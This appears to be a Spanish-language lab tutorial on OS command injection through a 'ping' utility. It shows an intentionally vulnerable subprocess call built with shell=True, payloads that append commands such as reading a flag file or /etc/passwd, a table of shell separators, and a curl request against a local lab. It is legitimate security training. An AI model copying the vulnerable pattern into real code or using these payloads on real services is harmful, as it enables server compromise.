## El ping que no debería existir

El lab tiene una utilidad de "ping" que pasa tu input DIRECTO a la shell:

```python
# Código VULNERABLE del lab:
result = subprocess.run(f'ping -c 1 -W 2 {host}', shell=True)
```

Uso normal: `/ping?host=8.8.8.8` → hace ping a 8.8.8.8.

Inyección: `/ping?host=8.8.8.8;cat /tmp/flags/flag1.txt` → hace ping Y lee el archivo.

## Los separadores de comandos

| Separador | Comportamiento | Ejemplo |
|---|---|---|
| `;` | Ejecuta ambos (siempre) | `ping x; cat /flag` |
| `&&` | Segundo solo si primero OK | `ping x && cat /flag` |
| `\|\|` | Segundo solo si primero FALLA | `ping x \|\| cat /flag` |
| `\|` | Pipe: salida del primero → entrada del segundo | `cat /etc/passwd \| grep root` |
| `` ` `` | Command substitution | `` ping `whoami` `` |
| `$()` | Command substitution | `ping $(whoami)` |
| `\n` | Nueva línea = nuevo comando | `ping x\ncat /flag` |

## Extrae la primera flag

```bash
# En el lab (levántalo desde el panel Laboratorio):
curl "http://127.0.0.1:18084/ping?host=8.8.8.8;cat%20/tmp/flags/flag1.txt"
```

La respuesta contiene el output del ping Y el contenido del archivo.
